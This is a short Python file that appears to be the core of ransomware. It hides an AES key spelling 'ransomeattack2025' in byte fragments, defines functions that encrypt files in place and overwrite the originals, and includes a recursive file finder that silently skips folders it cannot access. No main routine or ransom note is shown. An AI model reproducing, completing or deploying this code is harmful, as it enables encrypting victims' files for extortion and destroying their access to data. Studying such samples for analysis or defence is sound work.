from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad




def get_key():
    
    parts = [
        bytes([114, 97, 110]),  # 'ran'
        bytes([115, 111, 109]),  # 'som'
        bytes([101, 97, 116]),  # 'eat'
        bytes([116, 97, 99]),  # 'tac'
        bytes([107, 50, 48, 50, 53])  # 'k2025'
    ]
    return b''.join(parts).decode()
    
fullkey=get_key().encode().ljust(32, b'\0')


def aes_encrypt(data, fullkey):
    iv = get_random_bytes(16)
    cipher = AES.new(fullkey, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(data, AES.block_size))
    return iv + encrypted 




def aes_decrypt(encrypted_data, fullkey):
 
    if len(encrypted_data) < 16:
        raise ValueError("Encrypted data is too short to contain IV")
    
    iv = encrypted_data[:16]  
    encrypted = encrypted_data[16:] 
    cipher = AES.new(fullkey, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(encrypted), AES.block_size)

def decrypt_file(file, fullkey):
    with open(file, "rb") as f:
        encrypted_data = f.read()

    if len(encrypted_data) < 16:

        return

    try:
        decrypted_data = aes_decrypt(encrypted_data, fullkey)
        with open(file, "wb") as f:
            f.write(decrypted_data)
        print(f"Decrypted: {file}")
    except Exception as e:
        pass






def encrypt_file(file):
    with open(file, "rb") as f:
        original_data = f.read()
        encrypted_data = aes_encrypt(original_data, fullkey)
   
    with open(file, "wb") as f:
        f.write(encrypted_data)



def safe_rglob(base_dir, pattern):
    try:
        for entry in base_dir.iterdir():
            try:
                if entry.is_dir():
                    yield from safe_rglob(entry, pattern)  
                elif entry.match(pattern):
                    yield entry
            except (PermissionError, FileNotFoundError) as e:
                pass
    except (PermissionError, FileNotFoundError) as e:
        pass

        
